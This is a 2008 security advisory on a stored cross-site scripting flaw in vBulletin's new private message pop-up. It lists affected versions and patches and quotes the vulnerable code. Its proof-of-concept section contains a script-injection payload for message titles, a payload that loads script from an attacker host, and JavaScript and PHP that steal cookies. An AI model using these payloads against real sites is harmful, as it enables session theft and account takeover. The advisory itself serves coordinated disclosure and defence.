       vBulletin Cross Site Scripting Vulnerability


*Advisory Information*

Title: vBulletin Cross Site Scripting Vulnerability
Advisory ID: CORE-2008-0813
Advisory URL: http://www.coresecurity.com/my-advisory
Date published: 2008-08-20
Date of last update: 2008-08-19
Vendors contacted: vBulletin team
Release mode: Coordinated release


*Vulnerability Information*

Class: XSS flaw
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: N/A	
CVE Name: N/A	


*Vulnerability Description*

vBulletin [1] is a community forum solution for a wide range of users,
including industry leading companies. A XSS vulnerability has been
discovered that could allow an attacker to carry out an action
impersonating a legal user, or to obtain access to a user's account.
This flaw allows unauthorized disclosure and modification of
information, and it allows disruption of service.


*Vulnerable Packages*

. vBulletin 3.7.2 Patch Level 1.
. vBulletin 3.6.10 Patch Level 3.
. Older versions are probably affected too, but they were not checked.


*Non-vulnerable Packages*

. vBulletin 3.7.2 Patch Level 2.
. vBulletin 3.6.10 Patch Level 4.


*Vendor Information, Solutions and Workarounds*

vBulletin team has released patches for this flaw (see [2]), and new
fixed versions of vBulletin (3.6.11 and 3.7.3) will be available on
Tuesday, August 26th. Refer to [3] for more details.


*Credits*

This vulnerability was discovered and researched by Federico Muttis from
Core Security Technologies.


*Technical Description / Proof of Concept Code*

This is a Cross Site Scripting (XSS) vulnerability within vBulletin
community forum solution. In order to exploit this flaw the following
option needs to be activated:
'http://victim/vBulletin/profile.php?do=editoptions' (Show New Private
Message Notification Pop-Up enabled). There are many forums with this
option enabled by default for all new users.

The title is not being encoded in the following rendered HTML code:

/-----------

<!--
// script to show new private message popup
if (confirm("You have a new private message.\n\nSender:
[SENDER_USERNAME]\nTitle: '[PRIVATE_MESSAGE_TITLE]'\n\nClick OK to view
it, or cancel to hide this prompt."))
{
	// Output when OK is clicked
	if (confirm("Open the message in a new window?\n\n(Press cancel to open
in the current window.)"))
	{
		var winobj =
window.open("private.php?do=showpm&pmid=[PRIVATE_MESSAGE_ID]", "pmnew",
"statusbar=yes,menubar=yes,scrollbars=yes,toolbar=yes,location=yes,directories=yes,resizable=yes,top=50,left=50");
		if (winobj == null)
		{
			alert("Unable to open a new browser window,\n This might be due to a
'popup blocker'");
		}
	}
	else
	{
		window.location = "private.php?do=showpm&pmid=[PRIVATE_MESSAGE_ID]";
	}
}
// end pm popup script
//-->

- -----------/

The variable '$newpm[title]' in 'install/vbulletin-style.xml' was
previously de-sanitized in 'global.php' and only slash-escaping survives:

/-----------

//
#############################################################################
// get new private message popup
$shownewpm = false;
if ($vbulletin->userinfo['pmpopup'] == 2 AND
$vbulletin->options['checknewpm'] AND $vbulletin->userinfo['userid'] AND
!defined('NOPMPOPUP'))
{
	$userdm =& datamanager_init('User', $vbulletin, ERRTYPE_SILENT);
	$userdm->set_existing($vbulletin->userinfo);
	$userdm->set('pmpopup', 1);
	$userdm->save(true, 'pmpopup');	// 'pmpopup' tells db_update to issue a
shutdownquery of the same name
	unset($userdm);

	if (THIS_SCRIPT != 'private' AND THIS_SCRIPT != 'login')
	{
		$newpm = $db->query_first("
		SELECT pm.pmid, title, fromusername
		FROM " . TABLE_PREFIX . "pmtext AS pmtext
		LEFT JOIN " . TABLE_PREFIX . "pm AS pm USING(pmtextid)
		WHERE pm.userid = " . $vbulletin->userinfo['userid'] . "
		AND pm.folderid = 0
		ORDER BY dateline DESC
		LIMIT 1");
	
		$newpm['username'] =
addslashes_js(unhtmlspecialchars($newpm['fromusername'], true), '"');
		$newpm['title'] = addslashes_js(unhtmlspecialchars($newpm['title'],
true), '"');
		$shownewpm = true;
	}
}

- -----------/

Which of course allows XSS attacks.

The 'alert' Proof of Concept (PoC) exploit would be to write a PM to the
user you want to attack with this subject:

/-----------

- --></script><script>alert(/xss/.source)</script><!--
- -----------/

The admin impersonification exploit PoC (Working on IE6 Only) would be:

/-----------

- --></script><script src="http:"//attacker/vbStealer/egg.js></script><!--
- -----------/

Where the 'egg.js' script file is:

/-----------

// == XSS - Cookie stealing - vBulletin 3.7.2 PL1 ==
//
// Using the first method described in
// http://www.securityfocus.com/archive/107/308433
//
// To bypass HttpOnly cookie restrictions - Works in IE 6 and lower

var XmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
XmlHttp.open("GET","http://victim/vbStealer/logger.php",false);
XmlHttp.setRequestHeader("Host","attacker");
XmlHttp.send();

- -----------/

and the 'logger.php' script file:

/-----------

<?
// == XSS - Cookie stealing - vBulletin 3.7.2 PL1 ==

$all_cookies = "";
foreach ($_COOKIE as $cookie_name => $cookie_value) {
	$all_cookies .= "$cookie_name=$cookie_value, ";
}
rtrim($all_cookies, ", ");
file_put_contents("iplog.txt", "COOKIES: ".$all_cookies."\n", FILE_APPEND);
?>

- -----------/
